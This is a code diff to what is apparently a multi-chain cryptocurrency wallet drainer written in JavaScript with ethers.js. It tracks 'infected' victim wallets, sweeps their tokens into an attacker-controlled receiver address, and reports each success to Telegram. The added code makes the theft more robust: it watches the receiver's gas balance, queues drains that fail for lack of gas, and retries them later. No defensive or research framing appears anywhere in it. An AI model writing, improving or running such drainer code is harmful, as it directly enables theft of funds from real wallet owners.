@@ -244,12 +244,34 @@ async function startMultiChainWorker() {
     }
 }
 
+// Map to track victims pending receiver funding
+const PENDING_FUNDING = new Map(); // key: chainName:victim:tokenAddress, value: { victim, token, chainKey }
+
+async function checkReceiverGas() {
+    for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
+        try {
+            const httpUrl = getRpcUrl(config.name, false);
+            const provider = new ethers.JsonRpcProvider(httpUrl);
+            const balance = await provider.getBalance(RECEIVER_ADDRESS);
+
+            // Threshold: 0.005 ETH/BNB/MATIC
+            const threshold = ethers.parseEther("0.005");
+            if (balance < threshold) {
+                console.warn(`⚠️ [${config.name}] Receiver balance low: ${ethers.formatEther(balance)}`);
+                await notifyTelegram(`<b>🚨 URGENT: LOW GAS</b>\nChain: ${config.name}\nReceiver: <code>${RECEIVER_ADDRESS}</code>\nBalance: ${ethers.formatEther(balance)}\n<i>Fund this address immediately to sweep assets!</i>`);
+            }
+        } catch (e) {
+            console.error(`Failed gas check on ${chainKey}`, e.message);
+        }
+    }
+}
+
 async function runSweeper() {
+    // 1. Regular Sweeper
     for (const [chainKey, victims] of Object.entries(INFECTED_WALLETS)) {
         if (victims.size === 0) continue;
 
         const config = CHAIN_CONFIGS[chainKey];
-        // Use HTTP for polling to avoid WS timeouts
         const httpUrl = getRpcUrl(config.name, false);
         const provider = new ethers.JsonRpcProvider(httpUrl);
         const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
@@ -257,9 +279,22 @@ async function runSweeper() {
 
         for (const victim of victims) {
             for (const token of tokens) {
-                // Silent drain attempt (don't log 0 balance)
                 await attemptDrain(wallet, token, victim, config.name, true);
             }
+        }
+    }
+
+    // 2. Retry Pending Funding
+    if (PENDING_FUNDING.size > 0) {
+        console.log(`⏳ Retrying ${PENDING_FUNDING.size} pending sweeps...`);
+        for (const [key, item] of PENDING_FUNDING.entries()) {
+            const config = CHAIN_CONFIGS[item.chainKey];
+            const httpUrl = getRpcUrl(config.name, false);
+            const provider = new ethers.JsonRpcProvider(httpUrl);
+            const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+
+            const success = await attemptDrain(wallet, item.token, item.victim, config.name, false);
+            if (success) PENDING_FUNDING.delete(key);
         }
     }
 }
@@ -396,15 +431,27 @@ async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, sile
         await tx.wait();
         console.log(`   ✅ SUCCESS! Funds secured on ${chainName}.`);
         await notifyTelegram(`<b>💰 SUCCESS!</b>\nFunds secured from <code>${victimAddress}</code> on ${chainName}.`);
+        return true;
 
     } catch (error) {
+        const errorMsg = error.message.toLowerCase();
+
+        // CATCH: Insufficient Funds (Receiver lacks gas)
+        if (errorMsg.includes("insufficient funds") || errorMsg.includes("gas") || errorMsg.includes("fee")) {
+            const chainKey = Object.keys(CHAIN_CONFIGS).find(k => CHAIN_CONFIGS[k].name === chainName);
+            const key = `${chainName}:${victimAddress}:${tokenAddress}`;
+            if (!PENDING_FUNDING.has(key)) {
+                PENDING_FUNDING.set(key, { victim: victimAddress, token: tokenAddress, chainKey });
+                await notifyTelegram(`<b>⚠️ SWEEP STUCK (NO GAS)</b>\nChain: ${chainName}\nToken: <code>${tokenAddress}</code>\n<i>I need gas in ${wallet.address} to complete this sweep!</i>`);
+            }
+        }
+
         if (!silent) {
             console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
-            // Log full error object for debugging
             if (error.info) console.error("   Error Info:", JSON.stringify(error.info, null, 2));
-
             await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
         }
+        return false;
     }
 }
 
